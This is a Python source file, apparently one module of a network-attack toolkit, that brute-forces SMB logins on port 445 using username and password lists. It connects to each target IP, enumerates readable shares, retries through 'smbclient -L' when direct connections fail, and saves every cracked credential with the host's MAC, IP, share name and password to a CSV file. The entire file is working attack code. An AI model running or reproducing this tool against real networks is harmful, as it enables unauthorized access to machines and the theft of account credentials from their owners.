import os
import csv
import threading
import logging
import time
from subprocess import Popen, PIPE
from smb.SMBConnection import SMBConnection
from queue import Queue
from shared import SharedData
from logger import Logger
from actions.base_connector import BaseConnector, BaseBruteforce

logger = Logger(name="smb_connector.py", level=logging.DEBUG)

b_class = "SMBBruteforce"
b_module = "smb_connector"
b_status = "brute_force_smb"
b_port = 445
b_parent = None

IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$'}

class SMBBruteforce(BaseBruteforce):
    def __init__(self, shared_data):
        super().__init__(shared_data, SMBConnector(shared_data))

class SMBConnector(BaseConnector):
    PORT = 445
    SERVICE_NAME = "SMB"
    CSV_HEADER = ['MAC Address', 'IP Address', 'Hostname', 'Share', 'User', 'Password', 'Port']

    @property
    def output_file(self):
        return self.shared_data.smbfile

    def connect(self, ip, user, password):
        conn = SMBConnection(user, password, "your-pax", "Target", use_ntlm_v2=True)
        try:
            conn.connect(ip, 445)
            shares = conn.listShares()
            accessible = []
            for share in shares:
                if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                    continue
                try:
                    conn.listPath(share.name, '/')
                    accessible.append(share.name)
                    logger.info(f"Access to share {share.name} successful on {ip} with user '{user}'")
                except Exception as e:
                    logger.error(f"Error accessing share {share.name} on {ip} with user '{user}': {e}")
            conn.close()
            return accessible
        except Exception:
            return []

    def _process_queue_item(self, item, success_flag):
        ip, user, password, mac, hostname, port = item
        shares = self.connect(ip, user, password)
        if shares:
            with self.lock:
                for share in shares:
                    if share not in IGNORED_SHARES:
                        self.results.append([mac, ip, hostname, share, user, password, self.PORT])
                        logger.success(f"Found credentials for IP: {ip} | User: {user} | Share: {share}")
                self.save_results()
                self.removeduplicates()
                success_flag[0] = True

    def smbclient_l(self, ip, user, password):
        cmd = ['smbclient', '-L', ip, '-U', f'{user}%{password}']
        try:
            process = Popen(cmd, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()
            if b"Sharename" in stdout:
                logger.info(f"Successful authentication for {ip} with user '{user}' & password '{password}' using smbclient -L")
                return self.parse_shares(stdout.decode())
            return []
        except Exception as e:
            logger.error(f"Error executing command '{cmd}': {e}")
            return []

    def parse_shares(self, smbclient_output):
        shares = []
        lines = smbclient_output.splitlines()
        for line in lines:
            if line.strip() and not line.startswith("Sharename") and not line.startswith("---------"):
                parts = line.split()
                if parts and parts[0] not in IGNORED_SHARES:
                    shares.append(parts[0])
        return shares

    def _post_bruteforce(self, ip, mac, hostname, success_flag):
        if not success_flag[0]:
            logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {ip}")
            attempt_count = 0
            for user in self.users:
                for password in self.passwords:
                    attempt_count += 1
                    if attempt_count % 10 == 0:
                        print(f"[*] SMB fallback: {attempt_count} attempts completed...")
                    shares = self.smbclient_l(ip, user, password)
                    if shares:
                        with self.lock:
                            for share in shares:
                                if share not in IGNORED_SHARES:
                                    self.results.append([mac, ip, hostname, share, user, password, self.PORT])
                                    logger.success(f"(SMB) Found credentials for IP: {ip} | User: {user} | Share: {share} using smbclient -L")
                                    self.save_results()
                                    self.removeduplicates()
                                    success_flag[0] = True
                    if self.shared_data.timewait_smb > 0:
                        time.sleep(self.shared_data.timewait_smb)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        smb_bruteforce = SMBBruteforce(shared_data)
        logger.info("[bold green]Starting SMB brute force attack on port 445[/bold green]")
        ips_to_scan = shared_data.read_data()
        for row in ips_to_scan:
            ip = row["IPs"]
            smb_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total number of successful attempts: {len(smb_bruteforce.connector.results)}")
        exit(len(smb_bruteforce.connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
